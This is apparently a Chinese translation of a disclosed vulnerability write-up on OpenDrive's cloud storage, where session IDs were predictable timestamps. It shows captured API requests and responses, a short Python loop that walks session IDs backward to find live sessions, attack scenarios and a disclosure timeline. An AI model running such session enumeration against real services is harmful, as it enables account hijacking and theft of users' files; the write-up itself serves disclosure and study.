@@ -1,0 +1,218 @@
+***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**
+
+**![看我如何发现OpenDrive云存储平台的会话机制漏洞](https://image.3001.net/images/20180426/15247333339933.png!small)**
+
+**最近在对比云存储解决方案时，我惊讶地发现很多公司仍然在提供无限量云端数据存储服务方案，像OpenDrive公司就是这样（注意别和[OpenDRIVE格式规范](https://en.wikipedia.org/wiki/OpenDRIVE_\(specification\))混淆），[OpenDrive公司](https://www.opendrive.com/pricing)专为个人、商业团体和公司企业提供无限存储方案。**
+
+除了传统的云存储功能外，OpenDrive还以软件客户端和移动APP的应用形式，为使用客户提供存储备份和内容管理解决方案，据OpenDrive官网介绍，包括T-Mobile、Ancestry.com和REMAX在内的很多知名公司，都是其客户群体。
+
+## 发现
+
+我通过网页客户端，注册了一个OpenDrive的试用账户进行测试。在上传了一些测试文件之后，我留意查看了其标记和API请求后发现，OpenDrive公司网站架构为WordPress，而且包括样式、登录和API使用等很多地方都有明显定制化开发的痕迹。
+
+![看我如何发现OpenDrive云存储平台的会话机制漏洞](https://image.3001.net/images/20180426/15247333212542.png!small)
+
+我还通过HTTP代理注意到，在整个存储过程中，存储机制会对两个API服务端发起调用，一个是www开头且用cookie进行验证的子域名服务端，另一个是如下以web开头并用单独的
+session ID 进行验证的API服务端：
+
+    
+    
+    GET https://web.opendrive.com/api/v1/download/file.json/ABC123***REMOVED***?session_id=1517592191112474005&inline=0&preview=1 HTTP/1.1
+    Host: web.opendrive.com
+    Connection: keep-alive
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36
+    Accept: image/webp,image/apng,image/*,*/*;q=0.8
+    Accept-Encoding: gzip, deflate, br
+    Accept-Language: en-US,en;q=0.9
+
+注意上述GET请求中session_id中的值：
+
+> session_id=1517592191 112474005  
+>
+
+这个值与[Unix系统下的时间戳](https://en.wikipedia.org/wiki/Unix_time)有些类似，它极有可能是用户初始登录请求时的时间点转化过来的信息
+---不太好是吧！实际上，前10个数字就是从我账户首次登录时的 日期/时间（data/time）信息转化过来的。  
+
+![看我如何发现OpenDrive云存储平台的会话机制漏洞](https://image.3001.net/images/20180426/15247332878899.png!small)
+
+上面session_id中剩下的9位数字可能只是相同登录时间下的其它更精确的生成值，例如来自服务器端函数，如PHP的microtime中生成的毫秒。我尝试通过连续发出大量登录请求，来比较生成的session_id值进行验证，正如预测的那样，这些数字都是连续的时间值。
+
+接下来，我决定看看这种会话机制是如何使用的，它对OpenDrive’产品的安全性影响如何。由于网页客户端对该API的调用功能有限，所以我在测试手机上安装了一个OpenDrive的安卓应用APP。
+
+![看我如何发现OpenDrive云存储平台的会话机制漏洞](https://image.3001.net/images/20180426/15247333712109.png!small)
+
+在测试手机上部署好请求代理之后，我就登录了自己的OpenDrive账户，开始浏览文件、移动文件夹、访问我账户下的其它信息。经过观察，我发现，所有API服务端都使用了相同的，且存在漏洞缺陷的以下session_id生成机制，如以下请求示例：
+
+    
+    
+    GET <https://ai2.opendrive.com/api/v1/users/info.json/1517592191112474005> HTTP/1.1
+    
+    session_id: 1517592191112474005
+    
+    Host: ai2.opendrive.com
+    
+    Connection: Keep-Alive
+    
+    Accept-Encoding: gzip
+    
+    User-Agent: okhttp/3.7.0
+
+上述请求发起来，返回了相应的JSON响应如下：
+
+    
+    
+    {
+     "UserID": 1853669,
+     "AccessUserID": 0,
+     "UserName": "***REMOVED***",
+     "UserFirstName": "***REMOVED***",
+     "UserLastName": "***REMOVED***",
+     "PrivateKey": "***REMOVED***",
+     "Trial": "0",
+     "UserSince": "1517591533",
+     "BwResetLast": "1517591533",
+     "AccType": "1",
+     "MaxStorage": "5120",
+     "StorageUsed": "361144",
+     "BwMax": "1024",
+     "BwUsed": "0",
+     "FVersioning": "0",
+     "FVersions": "10",
+     "DailyStat": 0,
+     "UserLang": "en",
+     "MaxFileSize": "102400",
+     "Level": "1",
+     "UserPlan": "Basic Plan",
+     "TimeZone": "America\/Los_Angeles",
+     "MaxAccountUsers": "1",
+     "IsAccountUser": 0,
+     "CompanyName": "",
+     "Email": "***REMOVED***",
+     "Phone": "",
+     "Avatar": null,
+     "AvatarColor": "a38f84",
+     "AdminMode": 1,
+     "DueDate": "0000-00-00",
+     "WebLink": "",
+     "PublicProfiles": 0,
+     "RootFolderPermission": 2,
+     "CanChangePwd": 1,
+     "IsPartner": 0,
+     "Partner": "OpenDrive",
+     "SupportUrl": "http:\/\/support.opendrive.com",
+     "PartnerUsersDomain": ".opendrive.com",
+     "Suspended": false,
+     "Affiliation": "0",
+     "UserUID": "5ac61707c2ee6"
+    }
+
+同样的，以上信息说明，该应用的所有方面都应该是由一个高度可预测且顺序的“session”值来控制的。以下是获取文件夹内容的请求示例：
+
+    
+    
+    GET https://ai2.opendrive.com/api/v1/folder/list.json/1517592191112474005/NjlfMTA2NzgyNF93RjZaUw?last_request_time=0&offset=0 HTTP/1.1
+    session_id: 1517592191112474005
+    Host: ai2.opendrive.com
+    Connection: Keep-Alive
+    Accept-Encoding: gzip
+    User-Agent: okhttp/3.7.0
+
+响应结果如下：
+
+    
+    
+    {
+     "DirUpdateTime": "1522940036",
+     "Name": "Pictures",
+     "ParentFolderID": "NjlfMF93RjZaUw",
+     "DirectFolderLink": "https:\/\/od.lk\/fl\/NjlfMTA2NzgyNF8",
+     "ResponseType": 1,
+     "Folders": [],
+     "Files": [{
+      "FileId": "NjlfNzU3MTg2OV9RRDgxUA",
+      "Name": "1337.jpg",
+      "GroupID": 0,
+      "Extension": "jpg",
+      "Size": "5289",
+      "Views": "0",
+      "Version": "",
+      "Downloads": "1",
+      "DateModified": "1522940033",
+      "Access": "2",
+      "Link": "https:\/\/od.lk\/f\/NjlfNzU3MTg2OV8",
+      "DownloadLink": "https:\/\/od.lk\/d\/NjlfNzU3MTg2OV8\/1337.jpg",
+      "StreamingLink": "https:\/\/od.lk\/s\/NjlfNzU3MTg2OV8\/1337.jpg",
+      "TempStreamingLink": "https:\/\/ai2.opendrive.com\/api\/download\/file.json\/NjlfNzU3MTg2OV8?inline=1",
+      "ThumbLink": "https:\/\/ai2.opendrive.com\/api\/file\/thumb.json\/NjlfNzU3MTg2OV9RRDgxUA?session_id=19ebbbef64d8a5404cc0b16603cea3de659c607a23ae639986d5e5c477f6b5e8",
+      "Password": "",
+      "EditOnline": 1
+     }, {
+      "FileId": "NjlfNzU3MTg3MF9ZQ3NDYg",
+      "Name": "test.jpg",
+      "GroupID": 0,
+      "Extension": "jpg",
+      "Size": "51756",
+      "Views": "0",
+      "Version": "",
+      "Downloads": "0",
+      "DateModified": "1522940034",
+      "Access": "2",
+      "Link": "https:\/\/od.lk\/f\/NjlfNzU3MTg3MF8",
+      "DownloadLink": "https:\/\/od.lk\/d\/NjlfNzU3MTg3MF8\/test.jpg",
+      "StreamingLink": "https:\/\/od.lk\/s\/NjlfNzU3MTg3MF8\/test.jpg",
+      "TempStreamingLink": "https:\/\/ai2.opendrive.com\/api\/download\/file.json\/NjlfNzU3MTg3MF8?inline=1",
+      "ThumbLink": "https:\/\/ai2.opendrive.com\/api\/file\/thumb.json\/NjlfNzU3MTg3MF9ZQ3NDYg?session_id=19ebbbef64d8a5404cc0b16603cea3de659c607a23ae639986d5e5c477f6b5e8",
+      "Password": "",
+      "EditOnline": 1
+     }]
+    }
+
+注意了，通过分析，我发现，在这种会话机制下，任何OpenDrive系统下的用户账户都会被劫持，而且各自的私人文件都会被以下一段简单的脚本来实现获取或破坏，这种情况很难认为它是一个漏洞，也不会觉得是一种根本的设计缺陷。
+
+    
+    
+    url = "https://ai2.opendrive.com/api/v1/users/info.json"
+    session = 1517592191112474005
+    while True:
+        f_url = "{}/{}".format(url, session)
+        r = requests.get(f_url)
+        if r.status_code == 200:
+            print(f_url)
+        session -= 1
+
+## 漏洞利用场景
+
+这种会话机制的风险显而易见，但主要存在两种攻击场景：一是有适度资源支持的攻击者可以轻易地探测到系统中有效的其它用户会话；二是针对单个用户的定向攻击只需知道用户的大概登录时间，这缩小了攻击者的会话查找范围。其它风险隐患：
+
+> 会话不会过期，OpenDrive系统下我二月份测试的会话在三月份仍然有效；
+>
+> 每次登录都会生成一个新的会话，这也意味着，任何给定用户会存在多种会话条目；
+>
+> 存在漏洞的会话机制不只存在于安卓 APP/客户端，一样存在于网页和桌面系统的其它客户端中，实际上也就是说，所有OpenDrive用户都会受到影响。
+
+不清楚在之前的OpenDrive的缓解措施中，这种会话还存在多少，但可以肯定的是，这确实是一个安全威胁。
+
+## 漏洞处理进程
+
+> 2017-02-05 漏洞初报
+>
+> 2017-02-06 OpenDrive告知我已把问题转向开发团队
+>
+> 2017-02-13 我继续跟进，被告知开发团队仍在处理
+>
+> 2017-02-22 我继续跟进，OpenDrive告知会给我回复，之后杳无消息
+>
+> 2017-03-01 我接着跟进，没有回复
+>
+> 2017-03-08 我接着跟进，被告知暂时没有更新，但会尽快确定修复策略
+>
+> 2017-03-09 我接着跟进，技术支撑团队告知我“据说”已经修复
+>
+> 2017-03-09 OpenDrive确定已经进行了修复
+
+## 总结
+
+云存储平台的安全隐患非常关键，而OpenDrive官方在处理这个漏洞时却漫不经心，严格来说，这也能算核心产品的关键漏洞了，他们却只是简单把它看成一个低危漏洞来处理。好在，OpenDrive最终有成功修复了该漏洞，我呢，也得到了他们区区$50美金的奖赏。  
+
+ ***参考来源：[randywestergren](https://randywestergren.com/compromising-opendrives-cloud-storage-accounts-or-how-not-to-design-session-management/)，FreeBuf 小编 clouds 编译，转载请注明来自 FreeBuf.COM**  
+
